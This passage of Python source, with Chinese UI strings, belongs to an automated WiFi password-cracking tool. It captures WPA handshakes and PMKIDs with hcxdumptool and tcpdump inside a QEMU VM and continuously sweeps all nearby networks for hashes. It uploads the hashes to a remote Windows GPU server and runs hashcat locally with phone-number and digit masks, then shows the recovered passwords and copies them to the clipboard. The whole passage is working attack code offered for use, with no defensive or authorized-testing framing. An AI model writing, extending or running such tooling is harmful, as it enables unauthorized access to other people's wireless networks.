                    if '*' not in line or ':' not in line:
                        continue
                    rest = line.split('*', 1)[1]
                    if ':' not in rest:
                        continue
                    s_hex, pw = rest.split(':', 1)
                    try:
                        ssid = bytes.fromhex(
                            s_hex.strip().upper()).decode('utf-8', 'replace')
                        if ssid and ssid not in data[0]:
                            data[0][ssid] = pw.strip()
                    except Exception:
                        pass
        except Exception:
            pass
        self._known_cache = (now, data)
        return data

    def _traffic_bssids(self):
        # 曾出現 hash 的 BSSID = 有客戶端流量 = 可破候選
        out = set()
        for l in self.hash_pool:
            f = l.split('*')
            if len(f) > 3:
                out.add(f[3].lower())
        try:
            for p in glob.glob(os.path.join(HASHSTORE, '*.22000')):
                try:
                    with open(p) as f:
                        for l in f:
                            fs = l.split('*')
                            if len(fs) > 3:
                                out.add(fs[3].lower())
                except OSError:
                    pass
        except Exception:
            pass
        return out

    def _refresh_tree(self):
        traffic = self._traffic_bssids()
        key = (list(self.aps), frozenset(traffic))
        if key == getattr(self, '_last_aps', None):
            return
        self._last_aps = key
        cracked, captured = self._known()
        for tag, col in (('s4', '#34d399'), ('s3', '#a3e635'),
                         ('s2', '#fbbf24'), ('s1', '#f87171')):
            self.tree.tag_configure(tag, foreground=col)
        def _do():
            self.tree.delete(*self.tree.get_children())
            for ssid, bssid, ch, sig in self.aps:
                if ssid in cracked:
                    stat = '🔓 已破解'
                elif ssid in captured:
                    stat = '📦 已抓包'
                elif bssid.lower() in traffic:
                    stat = '🟢 有流量'
                else:
                    stat = ''
                try:
                    v = int(sig)
                except (TypeError, ValueError):
                    v = -99
                lvl = ('s4' if v >= -55 else 's3' if v >= -65
                       else 's2' if v >= -75 else 's1')
                bars = {'s4': '▂▄▆█', 's3': '▂▄▆', 's2': '▂▄', 's1': '▂'}[lvl]
                self.tree.insert('', 'end', values=(ssid, ch, bars, stat),
                                 tags=(lvl,))
            if self.target:
                for i, (ssid, bssid, ch, sig) in enumerate(self.aps):
                    if bssid == self.target[1]:
                        self.tree.selection_set(self.tree.get_children()[i])
                        break
        self._ui(_do)

    def _on_pick(self, event):
        sel = self.tree.selection()
        if not sel:
            return
        idx = list(self.tree.get_children()).index(sel[0])
        if idx >= len(self.aps):
            return
        ssid, bssid, ch, sig = self.aps[idx]
        self.target = (ssid, bssid, ch)
        self._tgt_miss = 0
        self._ui(lambda: self.lbl_target.config(
            text='%s' % ssid, fg=C_TEXT))
        self._ui(lambda: self.lbl_target_sub.config(
            text='%s · ch%s · %s' % (bssid, ch, sig or '?')))
        self._result('選定 %s — 自動開始…' % ssid, C_ACC)
        self._log('🎯 選定: %s (%s ch%s) → 自動開始' % (ssid, bssid, ch))
        cracked, _cap = self._known()
        pw = cracked.get(ssid)
        if pw:
            self.set_phase('done', '🔓 已破解（之前解過）', pw)
            self._result('🔓  %s' % pw, C_GREEN)
            self._log('🔓 %s 已破解過 → 密碼: %s' % (ssid, pw))
            try:
                self.root.clipboard_clear()
                self.root.clipboard_append(pw)
                self._log('   已複製到剪貼簿')
            except Exception:
                pass
            return
        if not self._running.is_set():
            threading.Thread(target=self._auto_loop,
                             args=(ssid, bssid, ch), daemon=True).start()

    def stop_all(self):
        self._stop.set()
        threading.Thread(target=lambda: (self._stop.wait(0),
                                         subprocess.run(['pkill', '-f',
                                                         'qemu-system-aarch64'],
                                                        capture_output=True)),
                         daemon=True).start()
        self._stop = threading.Event()
        self._running.clear()
        self.phase = ('idle', '已停止')
        self.hash_pool = set()
        self._result('已停止', C_DIM)
        self._log('■ 已停止')

    # ================= capture + post + wait =================
    def _auto_loop(self, ssid, bssid, ch):
        self._running.set()
        self.hash_pool = set()
        wip = self.var['wip'].get().strip()
        port = self.var['port'].get().strip()
        dur = int(self.var['dur'].get().strip() or '45')
        rnd = 0
        self.set_phase('scan', '已選定', '%s ch%s' % (bssid, ch))
        try:
            while not self._stop.is_set():
                if self._tgt_cancel.is_set():
                    self._tgt_cancel.clear()
                    self._log('✖ 目標已取消 — 返回巡掃')
                    break
                rnd += 1
                self._running.set()
                try:
                    self._round(rnd, ssid, bssid, ch, wip, port, dur)
                except Exception as e:
                    self._log('⚠️ 第 %d 輪錯誤: %r' % (rnd, e))
                if self.phase[0] == 'done':
                    break
        finally:
            self._running.clear()
            self.target = None

    def _coverage(self):
        # 物理機去虛擬化: 同機多BSSID只差前3字節, 以末3字節為物理鍵
        hits = {b[-6:] for b in self._traffic_bssids()}
        full = {b[-6:] for b in self.aps_seen.keys()}
        reach = {b[-6:] for b, v in self.aps_seen.items()
                 if v[2] is not None and v[2] >= -75}
        return full, reach, hits

    def _rca_loop(self):
        while not self._stop.is_set():
            for _ in range(120):
                if self._stop.is_set():
                    return
                time.sleep(1)
            if not self.vm_ready(timeout=8):
                continue
            if self.target or self._running.is_set():
                continue
            try:
                self._rca_round()
            except Exception as e:
                self._ev('rca', 'err=%r' % e)
            for _ in range(420):
                if self._stop.is_set():
                    return
                time.sleep(1)

    def _rca_round(self):
        # rcascan=active: 只有回應我們探測請求的 AP 會列出 = 雙向可達
        chans = {}
        for _b, v in self.aps_seen.items():
            try:
                c = int(v[1])
            except (TypeError, ValueError):
                continue
            if c > 14 and c not in (36, 40, 44, 48):
                continue
            g = v[2] if v[2] is not None else -95
            chans[c] = chans.get(c, 0) + 1 + max(0, g + 90) // 20
        if not chans:
            chans = {1: 1, 6: 1, 11: 1}
        top = [c for c, _w in sorted(chans.items(),
                                     key=lambda kv: -kv[1])[:5]]
        now = int(time.time())
        got = 0
        for c in top:
            if self.target or self._running.is_set():
                self._ev('rca', 'abort=target')
                break
            script = (BIND +
                      'ls /sys/class/ieee80211/ | grep -q . || exit 0\n' +
                      ('timeout 24 ' + CH +
                       'hcxdumptool -i wlan0 -c %d%s --rcascan=active '
                       '--rds=4 2>&1\n') % (c, 'b' if c > 14 else 'a'))
            try:
                with self._cap_lock:
                    r = subprocess.run(VM_SSH.split() + ['sh', '-s'],
                                       input=script.encode(),
                                       capture_output=True, timeout=90)
            except Exception as e:
                self._ev('rca', 'err=%r' % e)
                continue
            out = (r.stdout or b'').decode('utf-8', 'replace') + \
                  (r.stderr or b'').decode('utf-8', 'replace')
            for l in out.splitlines():
                if '|' not in l:
                    continue
                f = l.split('|')
                if len(f) > 4:
                    x = f[4].strip().lower().replace(':', '')
                    if re.fullmatch(r'[0-9a-f]{12}', x):
                        self.reach_seen[x] = now
                        got += 1
        self.reach_seen = {k: v for k, v in self.reach_seen.items()
                          if now - v < 3600}
        try:
            tmp = REACH_SEEN + '.tmp'
            with open(tmp, 'w') as f:
                json.dump(self.reach_seen, f)
            os.replace(tmp, REACH_SEEN)
        except Exception:
            pass
        self._ev('rca', 'ch=%d resp=%d pool=%d' % (
            len(top), got, len(self.reach_seen)))

    def _sweep_round(self):
        traffic = self._traffic_bssids()
        chans = {}
        for _b, v in self.aps_seen.items():
            try:
                c = int(v[1])
            except (TypeError, ValueError):
                continue
            if c > 14:
                continue
            g = v[2] if v[2] is not None else -95
            e = chans.setdefault(c, [0, -100])
            e[0] += 12 if _b in traffic else 1
            if g > e[1]:
                e[1] = g
        chans = {c: (n + max(0, g + 90) // 2) for c, (n, g) in chans.items()}
        if not chans:
            chans = {1: 1, 6: 1, 11: 1}
        ch5 = {}
        for _b, v in self.aps_seen.items():
            try:
                c = int(v[1])
            except (TypeError, ValueError):
                continue
            if c <= 14:
                continue
            g = v[2] if v[2] is not None else -95
            e = ch5.setdefault(c, [0, -100])
            e[0] += 1
            if g > e[1]:
                e[1] = g
        ch5 = dict(sorted(((c, n + max(0, g + 90) // 2)
                          for c, (n, g) in ch5.items()),
                         key=lambda kv: -kv[1])[:4])
        script = (BIND +
                  'ls /sys/class/ieee80211/ | grep -q . || { echo NOWLAN; exit 0; }\n' +
                  'find /newroot -maxdepth 1 -name "*.pcapng*" '
                  '-mmin +30 -delete 2>/dev/null\n' +
                  CH + 'sh -c "find /tmp -maxdepth 1 -type f '
                     '-mmin +90 -delete 2>/dev/null; echo x > /tmp/.w '
                     '2>/dev/null || rm -rf /tmp/*; rm -f /tmp/.w"\n' +
                  CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                  CH + 'iw reg set TW 2>/dev/null\n')
        if self.target or self._running.is_set():
            return 0
        total = 0
        for i, (c, w) in enumerate(sorted(chans.items(),
                                          key=lambda kv: -kv[1])):
            dwell = min(45, 8 + 3 * w)
            total += dwell + 6
            script += ('timeout %d ' % (dwell + 4) +
                       CH + 'hcxdumptool -i wlan0 -c %da '
                            '-w /tmp/sw_%d.pcapng -t %d --rds=2 '
                            '2>/dev/null\n' % (c, i, dwell))
        for j, (c, w) in enumerate(ch5.items()):
            dwell5 = min(30, 12 + 2 * w)
            total += dwell5 + 5
            if c in (36, 40, 44, 48):
                script += ('timeout %d ' % (dwell5 + 4) + CH +
                           'hcxdumptool -i wlan0 -c %db '
                           '-w /tmp/sw5_%d.pcapng -t %d --rds=2 '
                           '2>/dev/null\n' % (c, j, dwell5))
            else:
                script += (CH + 'iw dev wlan0 set channel %d 2>/dev/null'
                           '\nsleep 1\n' % c +
                           'timeout %d ' % (dwell5 + 3) + CH +
                           'tcpdump -i wlan0 -s 0 -w /tmp/sw5_%d.pcap '
                           '2>/dev/null\n' % j)
        script += (CH + 'hcxpcapngtool --all -o /tmp/sw.22000 '
                   '/tmp/sw_*.pcapng* /tmp/sw5_*.pcap* 2>/dev/null\n' +
                   CH + 'cat /tmp/sw.22000 2>/dev/null\n')
        try:
            with self._cap_lock:
                r = subprocess.run(VM_SSH.split() + ['sh', '-s'],
                                   input=script.encode(), capture_output=True,
                                   timeout=total + 90)
            out = (r.stdout or b'').decode('utf-8', 'replace')
        except Exception as e:
            self._ev('sweep', 'cycle err=%r' % e)
            return 0
        if 'NOWLAN' in out:
            self._ev('sweep', 'wlan_missing_skip')
            time.sleep(15)
            return 0
        lines = [l.strip() for l in out.splitlines() if l.startswith('WPA*')]
        pth = os.path.join(HASHSTORE, 'sweep_all.22000')
        seen = set()
        try:
            with open(pth) as f:
                seen = {x.strip() for x in f}
        except OSError:
            pass
        new = [l for l in lines if l not in seen]
        if new:
            os.makedirs(HASHSTORE, exist_ok=True)
            with open(pth, 'a') as f:
                f.write('\n'.join(new) + '\n')
            self.hash_pool.update(new)
            self._enqueue_sweep_hits(new)
        self._ev('sweep', 'cycle ch=%d new=%d' % (len(chans), len(new)))
        return len(new)

    def _sweep_loop(self):
        try:
            while not self._stop.is_set() and not self.target:
                try:
                    self._sweep_round()
                    full, reach, hits = self._coverage()
                    fh, rh = full & hits, reach & hits
                    fp = 100.0 * len(fh) / len(full) if full else 0
                    rp = 100.0 * len(rh) / len(reach) if reach else 0
                    self._ev('cov', 'list=%.0f %d/%d reach=%.0f %d/%d'
                             ' hits=%s'
                             % (fp, len(fh), len(full), rp, len(rh),
                                len(reach), ','.join(sorted(fh))))
                    self.set_phase('scan', '加權巡掃（AP多頻道駐留久）',
                                   '🎯 列表覆蓋 %.0f%%（%d/%d）'
                                   % (fp, len(fh), len(full)))
                except Exception as e:
                    self._ev('sweep', 'loop err=%r' % e)
                time.sleep(3)
        finally:
            self._sweep_on = False

    def _round(self, rnd, ssid, bssid, ch, wip, port, dur):
        ckd = self._known()[0]
        if ckd.get(ssid):
            self.set_phase('done', '已破解: %s' % ckd[ssid],
                           '%s 之前已解出' % ssid)
            return
        if not self.boot_vm_if_needed():
            self.set_phase('cap', '虛擬機未就緒，等待...', '重試中')
            time.sleep(15)
            return
        # ---- 2. capture ----
        self.hash_pool.clear()
        try:
            chi = int(ch)
        except (TypeError, ValueError):
            chi = 1
        act5 = 36 <= chi <= 48
        bssid_c = ':'.join(bssid[i:i + 2]) if bssid else ''
        self.set_phase('cap', '第 %d 輪抓包 (%ds)' % (rnd, dur),
                       ('hcxdumptool5G %s ch%s' if act5
                        else 'tcpdump被動 %s ch%s' if chi > 14
                        else 'hcxdumptool %s ch%s') % (bssid, ch))
        if chi > 14 and not act5:
            capcmd = ('timeout %d ' % dur + CH +
                      'tcpdump -i wlan0 -s 0 -w /tmp/scan_%d '
                      '2>/dev/null\n' % rnd)
        else:
            capcmd = ('timeout %d ' % dur + CH + 'hcxdumptool -i wlan0 -c ' +
                      str(ch) + ('b' if act5 else 'a') +
                      (' --bpf=/tmp/t.bpf' if bssid_c else '') +
                      (' --m2max=16' if rnd >= 3 else '') +
                      ' -w /tmp/scan_%d -t 7 --rds=2 '
                      '2>&1 | tail -15\n' % rnd)
        script = (BIND +
CH + 'sh -c "rm -f /tmp/scan_*" 2>/dev/null\n' +
CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                  CH + 'iw dev wlan0 set type monitor 2>/dev/null\n' +
                  CH + 'ifconfig wlan0 up 2>/dev/null\n' +
                  CH + 'iw reg set TW 2>/dev/null\n' +
                  (CH + 'tcpdump -y IEEE802_11 -dd "wlan addr1 %s or wlan addr2 %s'
                   ' or wlan addr3 %s or type mgt subtype probereq"'
                   ' > /tmp/t.bpf 2>/dev/null\n'
                   % (bssid_c, bssid_c, bssid_c) if bssid_c else '') +
                  CH + 'iw dev wlan0 set channel %s 2>/dev/null\nsleep 3\n' % ch +
                  capcmd +
                  'echo "===CONVERT==="\n' +
                  CH + 'hcxpcapngtool --all -o /tmp/scan_%d.22000 /tmp/scan_%d '
                       '2>&1 | tail -4\n' % (rnd, rnd) +
                  'echo "===HASH==="\n' +
                  CH + 'cat /tmp/scan_%d.22000 2>/dev/null\n' % rnd +
                  'echo "===END==="\n' +
                  'echo "===RAWCOUNT==="\n' +
                  CH + 'grep -cv "^#" /tmp/scan_%d.22000 2>/dev/null\n' % rnd)
        t0 = time.time()
        with self._cap_lock:
            r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
                               capture_output=True, timeout=dur + 150)
        out = (r.stdout or b'').decode('utf-8', 'replace') + \
              (r.stderr or b'').decode('utf-8', 'replace')
        self._ev('cap', 'round=%d rc=%s dur=%.1fs out=%dB' % (
            rnd, r.returncode, time.time() - t0, len(out)))
        lines = out.splitlines()
        cap_part = []
        for line in lines:
            if '===CONVERT===' in line:
                break
            cap_part.append(line)
        hash_lines, in_hash = [], False
        for line in lines:
            if '===HASH===' in line:
                in_hash = True
                continue
            if '===END===' in line:
                in_hash = False
                continue
            if in_hash and line.strip():
                hash_lines.append(line.strip())
        self.hash_pool.update(hash_lines)
        self._enqueue_sweep_hits(hash_lines)
        raw = -1
        for i, line in enumerate(lines):
            if '===RAWCOUNT===' in line and i + 1 < len(lines):
                try:
                    raw = int(lines[i + 1].strip())
                except Exception:
                    pass
                break
        tl0 = self._target_lines()
        self._ev('conv', 'round=%d raw=%d got=%d tgt_pmkid=%d tgt_hs=%d' % (
            rnd, raw, len(hash_lines),
            sum(1 for h in tl0 if h.startswith('WPA*01')),
            sum(1 for h in tl0 if h.startswith('WPA*02'))))
        if raw > 0 and not hash_lines:
            self._log('   ⚠️ 轉換有 %d 行但讀到 0 — 讀取路徑異常' % raw)
        self._save_pcap(rnd, ssid, bssid)
        self._save_local(ssid, sorted(self.hash_pool))
        self.set_phase('conv', '本輪 %d hash（累計 %d）' % (len(hash_lines),
                        len(self.hash_pool)),
                       '只送 %s 相關的 %d 行' % (ssid, len(self._target_lines())))
        if not self._target_lines():
            self._log('   本輪無 %s 的握手包/PMKID — 再抓一輪' % ssid)
            for l in cap_part[-4:]:
                if l.strip():
                    self._log('   抓包器: %s' % l.strip()[:110])
            if raw != 0:
                # 抓包器正常（有其他 AP 的 hash），只是目標 AP 安靜 — 不算失敗
                miss = getattr(self, '_tgt_miss', 0) + 1
                self._tgt_miss = miss
                if miss >= 5:
                    self.set_phase('done',
                        '⚠️ %s 連續 %d 輪無握手包' % (ssid, miss),
                        '無客戶端 — 巡掃持續 PMKID 攻擊', C_RED)
                    self._ev('tgtmiss', 'ssid=%s miss=%d raw=%d' % (ssid, miss, raw))
                    self._result('⚠️ %s 暫無客戶端 — 巡掃持續 PMKID'
                                 ' 攻擊, 有人連上即收網' % ssid, C_RED)
                    self.target = None
                    try:
                        open('/tmp/mac_wifi_autotarget', 'w').close()
                    except Exception:
                        pass
                time.sleep(3)
                return
            self._ev('capfail', 'round=%d capout=%r' % (
                rnd, ' | '.join(cap_part)[:400]))
            streak = getattr(self, '_cap_streak', 0) + 1
            self._cap_streak = streak
            if streak >= 3:
                self._cap_streak = 0
                self._log('⚙️ 抓包連續失敗 → 重建抓包環境(QEMU重啟)')
                self._ev('heal', 'trigger=capfail x3')
                try:
                    subprocess.run(['pkill', '-f', 'qemu-system-aarch64'])
                except Exception:
                    pass
                time.sleep(2)
                self._startup_vm()
            else:
                time.sleep(3)
            return
        self._cap_streak = 0
        self._tgt_miss = 0
        # ---- 3. post (Windows 決定: 秒回 / 自動解 / 掛起待確認) ----
        status, pw = self._post(self._target_lines(), ssid, bssid, wip, port)
        if status is False:
            self._enqueue_upload(ssid, bssid)
        if status == 'cracked':
            self.set_phase('done', '🎉 破解成功', pw)
            self._result('🎉  %s' % pw, C_GREEN)
            self._log('🎉🎉 密碼: %s  (%s)' % (pw, ssid))
            return
        use_local = (status is False) or (status == 'pending'
                                          and not self._on_home_lan())
        if use_local:
            why = ('Windows 連不上' if status is False
                   else '外出且 Windows 顯存被佔用')
            self.set_phase('crack', '%s → Mac 本機破解' % why, 'hashcat 本機跑')
            self._result('本機破解中…', C_AMBER)
            result = self._crack_local()
            if result:
                self.set_phase('done', '🎉 本機破解成功', result)
                self._result('🎉  %s' % result, C_GREEN)
                self._log('🎉🎉 本機密碼: %s  (%s)' % (result, ssid))
                return
            self._log('⚠️ 本機破解無結果 — 30s 後重試')
            self._result('等 Windows (%s:%s)' % (wip, port), C_AMBER)
            for _ in range(30):
                if self._stop.is_set():
                    return
                time.sleep(1)
            return
        # ---- 4. Windows + Mac 同步破解 (誰先誰贏) ----
        win = {}

        def _win_wait():
            win['r'] = self._wait_result(wip, port, timeout=900)

        threading.Thread(target=_win_wait, daemon=True).start()
        if status == 'pending':
            self.set_phase('crack', 'Windows 掛起 + Mac 同步低難度解',
                           '手機/數字 mask 本機跑')
        else:
            self.set_phase('crack', 'Windows + Mac 同步破解中',
                           '手機/數字 mask 本機跑')
        self._result('破解中…', C_AMBER)
        result = self._crack_local(abort=lambda: bool(win.get('r')))
        if not result:
            for _ in range(950):
                if win.get('r') or self._stop.is_set():
                    break
                time.sleep(1)
            result = win.get('r')
        if result:
            self.set_phase('done', '🎉 破解成功', result)
            self._result('🎉  %s' % result, C_GREEN)
            self._log('🎉🎉 密碼: %s  (%s)' % (result, ssid))
        else:
            self._result('未出結果 — 下一輪', C_DIM)
            self._log('   本輪無密碼，繼續...')

    def _target_lines(self):
        b = self.target[1].lower() if self.target else ''
        out = []
        for h in self.hash_pool:
            if b and b in h.lower():
                out.append(h)
            elif h.startswith('WPA*01'):
                f = h.split('*')
                if len(f) >= 4 and f[2] == b:
                    out.append(h)
        return out

    def _enqueue_sweep_hits(self, new_lines):
        # 巡掃新 hash 屬掃描列表內未破解 AP → 入補傳隊列(有網自動傳)
        try:
            byb = {}
            for l in new_lines:
                f = l.split('*')
                if len(f) > 3:
                    byb.setdefault(f[3].lower(), []).append(l)
            ckd = self._known()[0]
            cnt = 0
            for b, ls in byb.items():
                ent = self.aps_seen.get(b) or self.aps_seen.get(b.upper())
                if not ent:
                    continue
                ssid = ent[0] or 'wifi'
                if ckd.get(ssid):
                    continue
                self._save_local_bssid(ssid, b, ls)
                self._enqueue_upload(ssid, b)
                cnt += 1
            if cnt:
                self._ev('sweep', 'enq %d AP for resend' % cnt)
        except Exception as e:
            self._ev('sweep', 'enq err=%r' % e)

    def _save_local_bssid(self, ssid, bssid, lines):
        try:
            os.makedirs(HASHSTORE, exist_ok=True)
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
            path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, bssid.lower()))
            seen = set()
            if os.path.exists(path):
                seen = set(l.strip() for l in open(path) if l.strip())
            nw = [l for l in lines if l.strip() not in seen]
            if nw:
                with open(path, 'a') as f:
                    for l in nw:
                        f.write(l + '\n')
        except Exception:
            pass

    def _save_local(self, ssid, lines):
        try:
            os.makedirs(HASHSTORE, exist_ok=True)
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
            b = self.target[1].lower() if self.target else 'x'
            path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, b))
            seen = set()
            if os.path.exists(path):
                seen = set(l.strip() for l in open(path) if l.strip())
            new = [l for l in lines if l not in seen]
            if new:
                with open(path, 'a') as f:
                    for l in new:
                        f.write(l + '\n')
        except Exception as e:
            self._log('⚠️ 存本機: %r' % e)

    def _save_pcap(self, rnd, ssid, bssid):
        try:
            os.makedirs(CAPSTORE, exist_ok=True)
            p = '/newroot/tmp/scan_%d' % rnd if RUNNER_MODE else '/tmp/scan_%d' % rnd
            r = subprocess.run(VM_SSH.split() + ['cat', p],
                               capture_output=True, timeout=60)
            data = r.stdout or b''
            if len(data) < 100:
                return
            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
            path = os.path.join(CAPSTORE, '%s_%s_%s.pcapng' % (
                safe, bssid.lower(), time.strftime('%Y%m%d-%H%M%S')))
            with open(path, 'wb') as f:
                f.write(data)
            self._ev('pcap', 'saved=%s bytes=%d' % (
                os.path.basename(path), len(data)))
            self._rotate_capstore()
        except Exception as e:
            self._ev('pcapfail', '%r' % e)

    def _rotate_capstore(self):
        try:
            files = sorted(glob.glob(CAPSTORE + '/*.pcapng'),
                           key=os.path.getmtime)
            total = sum(os.path.getsize(x) for x in files)
            for x in files:
                if total <= 300 * 1024 * 1024:
                    break
                total -= os.path.getsize(x)
                os.remove(x)
        except Exception:
            pass

    def _load_queue(self):
        try:
            with open(UQUEUE) as f:
                d = json.load(f)
            return d if isinstance(d, dict) else {}
        except Exception:
            return {}

    def _enqueue_upload(self, ssid, bssid):
        try:
            q = self._load_queue()
            q[bssid.lower()] = {'ssid': ssid, 'bssid': bssid,
                                'ts': time.strftime('%Y-%m-%d %H:%M:%S')}
            tmp = UQUEUE + '.tmp'
            with open(tmp, 'w') as f:
                json.dump(q, f)
            os.replace(tmp, UQUEUE)
            self._ev('queue', 'enq=%s n=%d' % (bssid, len(q)))
        except Exception as e:
            self._ev('queuefail', '%r' % e)

    def _backfill_upload(self):
        # 一次性回填: 历史 hashstore 早于入队功能上线, 从未上传破解过
        try:
            marker = os.path.join(HASHSTORE, '.backfill_v2')
            if os.path.exists(marker):
                return
            n = 0
            for fn in os.listdir(HASHSTORE):
                if not fn.endswith('.22000') or fn.startswith('sweep_all'):
                    continue
                safe, _, b = fn[:-6].rpartition('_')
                if not re.fullmatch(r'[0-9a-f]{12}', b):
                    continue
                self._enqueue_upload(safe or 'wifi', b)
                n += 1
            sp = os.path.join(HASHSTORE, 'sweep_all.22000')
            if os.path.exists(sp):
                byb = {}
                for l in open(sp):
                    l = l.strip()
                    if not l:
                        continue
                    f = l.split('*')
                    if len(f) > 3:
                        byb.setdefault(f[3].lower(), []).append(l)
                for b, ls in byb.items():
                    if not re.fullmatch(r'[0-9a-f]{12}', b):
                        continue
                    ent = self.aps_seen.get(b)
                    ssid = (ent[0] if ent and ent[0] else b)
                    self._save_local_bssid(ssid, b, ls)
                    self._enqueue_upload(ssid, b)
                    n += 1
            with open(marker, 'w') as f:
                f.write(str(n))
            self._ev('queue', 'backfill=%d' % n)
        except Exception as e:
            self._ev('queue', 'backfill err=%r' % e)

    def _hashstore_lines(self, ssid, bssid):
        safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
        path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, bssid.lower()))
        b = bssid.lower()
        out = []
        try:
            for l in open(path):
                l = l.strip()
                if not l:
                    continue
                if b in l.lower():
                    out.append(l)
                elif l.startswith('WPA*01'):
                    f = l.split('*')
                    if len(f) >= 4 and f[2] == b:
                        out.append(l)
        except Exception:
            pass
        return out

    def _sync_loop(self):
        self._backfill_upload()
        while not self._stop.is_set():
            for _ in range(60):
                if self._stop.is_set():
                    return
                time.sleep(1)
            q = self._load_queue()
            if not q:
                continue
            wip = self.var['wip'].get().strip() or DEFAULT_WIP
            port = self.var['port'].get().strip() or DEFAULT_PORT
            for key, ent in list(q.items()):
                lines = self._hashstore_lines(ent['ssid'], ent['bssid'])
                if not lines:
                    q.pop(key, None)
                    continue
                status, pw = self._post(lines, ent['ssid'], ent['bssid'],
                                        wip, port)
                if status is False:
                    break
                q.pop(key, None)
                if status == 'cracked':
                    self._log('📡 補傳 %s → Windows 秒回: %s' % (
                        ent['ssid'], pw))
                    if self.target and self.target[1].lower() == key:
                        self.set_phase('done', '🎉 補傳破解成功', pw)
                        self._result('🎉  %s' % pw, C_GREEN)
                else:
                    self._log('📡 補傳 %s 已送達 Windows (%s)' % (
                        ent['ssid'], status))
            try:
                tmp = UQUEUE + '.tmp'
                with open(tmp, 'w') as f:
                    json.dump(q, f)
                os.replace(tmp, UQUEUE)
            except Exception:
                pass

    def _read_pot_pw(self, pot):
        try:
            targets = set(l.split('*')[0] for l in self._target_lines())
            for line in open(pot):
                if ':' not in line:
                    continue
                hpart, pw = line.rsplit(':', 1)
                if hpart.strip() in targets:
                    return pw.strip()
        except Exception:
            pass
        return None

    def _crack_local(self, abort=None):
        hc = '/opt/homebrew/bin/hashcat'
        if not os.path.exists(hc):
            self._log('❌ Mac 沒裝 hashcat')
            return None
        hf = '/tmp/mac_crack.22000'
        try:
            with open(hf, 'w') as f:
                f.write('\n'.join(self._target_lines()) + '\n')
        except Exception:
            return None
        pot = os.path.expanduser('~/wifi_cracker/local_pot')
        pw = self._read_pot_pw(pot)
        if pw:
            self._log('   ✅ 本機 potfile 秒回')
            return pw
        # 只跑低難度: 6碼/手機門號/8碼純數字 (大字典交 Windows GPU)
        stages = [(None, '?d?d?d?d?d?d'),
                  (None, '09?d?d?d?d?d?d?d?d'),
                  (None, '?d?d?d?d?d?d?d?d')]
        for wl, mask in stages:
            if self._stop.is_set() or (abort and abort()):
                return None
            desc = mask or os.path.basename(wl)
            self._ui(lambda d=desc: self._set_text(
                self.phases['crack_sub'], 'Mac 本機: %s' % d))
            self._log('   本機階段: %s' % desc)
            cmd = [hc, '-m', '22000', '-w', '3',
                   '--potfile-path', pot, '--outfile-format', '2', hf]
            cmd += ['-a', '3', mask] if mask else [wl]
            t0 = time.time()
            try:
                rc = subprocess.run(cmd, capture_output=True,
                                    timeout=900).returncode
                self._ev('localcrack', 'stage=%s rc=%s dur=%.1fs' % (
                    desc, rc, time.time() - t0))
            except subprocess.TimeoutExpired:
                self._ev('localcrack', 'stage=%s TIMEOUT dur=%.1fs' % (
                    desc, time.time() - t0))
                self._log('   階段逾時，跳過')
            pw = self._read_pot_pw(pot)
            if pw:
                return pw
        return None

    def _on_home_lan(self):
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(('192.168.1.1', 1))
            ip = s.getsockname()[0]
            s.close()
            home = ip.startswith('192.168.1.')
            self._ev('lan', 'src=%s home=%s' % (ip, home))
            return home
        except Exception as e:
            self._ev('lan', 'err=%r home=False' % e)
            return False

    def _api_try(self, wip, port, path, data=None, timeout=12):
        # 外出端點故障轉移: 上次可用 → 家用IP → Tailscale IP
        eps = []
        good = getattr(self, '_good_ep', None)
        if good:
            eps.append(good)
        for e in (wip, TS_IP):
            if e and e not in eps:
                eps.append(e)
        last = None
        for ep in eps:
            try:
                url = 'http://%s:%s%s' % (ep, port, path)
                if data is None:
                    body = urllib.request.urlopen(url, timeout=timeout).read()
                else:
                    req = urllib.request.Request(
                        url, data=data,
                        headers={'Content-Type': 'application/json'},
                        method='POST')
                    body = urllib.request.urlopen(req, timeout=timeout).read()
                self._good_ep = ep
                self._api_ok_ts = time.time()
                return body.decode('utf-8', 'replace'), ep
            except Exception as e:
                last = e
        raise last

    def _post(self, hashes, ssid, bssid, wip, port):
        payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
                              'bssid': bssid.lower()}).encode()
        t0 = time.time()
        try:
            body, ep = self._api_try(wip, port, '/api/receive-hash',
                                     data=payload, timeout=12)
            if ep != wip:
                self._log('   Windows 改走 %s' % ep)
            self._log('   上傳成功: %s' % body[:140])
            self._ev('post', 'lines=%d dur=%.1fs body=%r' % (
                len(hashes), time.time() - t0, body[:200]))
            try:
                d = json.loads(body)
            except Exception:
                d = {}
            if d.get('password'):
                self._log('   ✅ Windows potfile 秒回: %s' % d['password'])
                return 'cracked', d['password']
            if d.get('pending'):
                return 'pending', None
            return 'auto', None
        except Exception as e:
            self._log('   上傳失敗: %s' % e)
            self._ev('postfail', 'dur=%.1fs err=%r' % (time.time() - t0, e))
            return False, None

    def _wait_result(self, wip, port, timeout=900):
        start = time.time()
        last = ''
        while time.time() - start < timeout:
            if self._stop.is_set():
                return None
            try:
                body = self._api_try(wip, port, '/api/state', timeout=8)[0]
                d = json.loads(body)
                status = d.get('status', '')
                msg = d.get('message', '')
                if msg and msg != last:
                    last = msg
                    self._log('   Windows 回報: %s' % msg)
                    self._ui(lambda m=msg: self._set_text(self.phases['crack_sub'], m))
                if status in ('done', 'cracked', 'idle'):
                    for r in d.get('results', []):
                        if r and r != 'No match':
                            return r
                    if status != 'cracking':
                        # check message for potfile instant answer
                        if 'Found in potfile' in d.get('message', ''):
                            m = re.search(r'Found in potfile:\s*(\S+)',
                                          d.get('message', ''))
                            if m:
                                return m.group(1)
                        if status in ('done', 'idle'):
                            time.sleep(2)
                            return None
            except Exception:
